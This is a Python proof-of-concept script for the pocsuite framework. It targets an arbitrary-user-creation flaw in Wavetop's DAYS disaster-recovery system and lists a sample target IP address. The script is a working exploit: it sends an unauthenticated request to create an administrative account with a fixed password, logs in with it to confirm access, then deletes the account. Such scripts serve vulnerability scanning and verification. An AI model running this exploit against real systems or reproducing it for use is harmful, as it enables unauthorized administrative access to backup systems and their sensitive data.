#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register, Output, POCBase
from pocsuite.thirdparty.guanxing import parse_ip_port, http_packet, make_verify_url
from pocsuite.lib.utils.randoms import rand_text_alpha

class TestPOC(POCBase):
	vulID = 'DSO-07087'
	cveID = ''
	cnvdID = ''
	cnnvdID = ''
	version = '1.0'
	author = '管理员'
	vulDate = '2022-07-25'
	createDate = '2022-07-25'
	updateDate = '2022-07-25'
	name = '浪擎科技 DAYS灾备系统 存在任意用户创建逻辑漏洞'
	desc = '浪擎科技 DAYS灾备系统 存在任意用户创建逻辑漏洞，攻击者可利用该漏洞创建管理用户，登录系统，获取系统的敏感信息。'
	solution = '<p>请关注厂商并更新至安全版本。厂商链接: http://www.wavetop.com.cn/<br></p>'
	severity = 'high'
	vulType = 'other'
	taskType = 'app-vul'
	proto = ['http']
	scanFlag = 1
	tag = ['important']
	references = ['']
	appName = '浪擎DAYS灾备软件'
	appVersion = 'all'
	cweID = 'CWE-other'
	appPowerLink =''
	samples = ['http://223.247.190.42:8000']
	isPublic = 0
	appDevLanguage = ''
	appCategory = 'WEB'
	
	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 80)
		result = {}
		headers = {
			"Content-Type": "application/x-www-form-urlencoded"
		}
		payload = '/authctrl/add_user'
		user = rand_text_alpha(5).lower()
		data = 'usertype=2&username=%s&password=Test_1234&retrypassword=Test_1234'%(user)
		vul_url = make_verify_url(self.url, payload, mod = 0)
		resp = req.post(vul_url, data=data, headers=headers, verify = False, allow_redirects = False, timeout = 10)
		if '1' == resp.content and resp.status_code ==200:
			data = '''username=%s&password=Test_1234'''%(user)
			verify_url1 = make_verify_url(self.url, "/loginctrl/login", mod=0)
			resp1 = req.post(verify_url1, headers=headers, data=data, timeout=10, verify=False, allow_redirects=False)
			if resp1.status_code == 200 and '<script>window.location.href=\'' + self.url.strip('/') + '/backup_config?back_url=outlines\';</script>' in resp1.content:
				result['VerifyInfo'] = http_packet(resp)
				result['VerifyInfo']['URL'] = vul_url
				result['VerifyInfo']['port'] = port
				result['VerifyInfo']['Content'] = '%s/Test_1234'%(user)
				try:
					vul_url2 = make_verify_url(self.url, '/authctrl/deluser/%s'%(user), mod = 0)
					req.post(vul_url2, headers=headers, verify = False, allow_redirects = False, timeout = 10)
				except Exception as e:
					pass
		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)
